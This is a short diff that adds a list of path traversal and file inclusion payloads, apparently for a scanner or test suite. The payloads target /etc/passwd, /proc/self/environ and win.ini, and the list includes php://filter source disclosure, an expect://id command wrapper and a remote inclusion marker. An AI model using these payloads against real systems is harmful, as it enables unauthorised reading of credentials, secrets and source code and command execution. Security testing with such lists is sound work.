@@ -1,0 +1,8 @@
+..%2f..%2f..%2f..%2fetc/passwd
+../../../../etc/passwd
+..\\..\\..\\Windows\\win.ini
+../../../../../../../../etc/issue
+../../../../proc/self/environ
+php://filter/convert.base64-encode/resource=index.php
+expect://id
+http://example.com/ # remote inclusion indicator (test only)
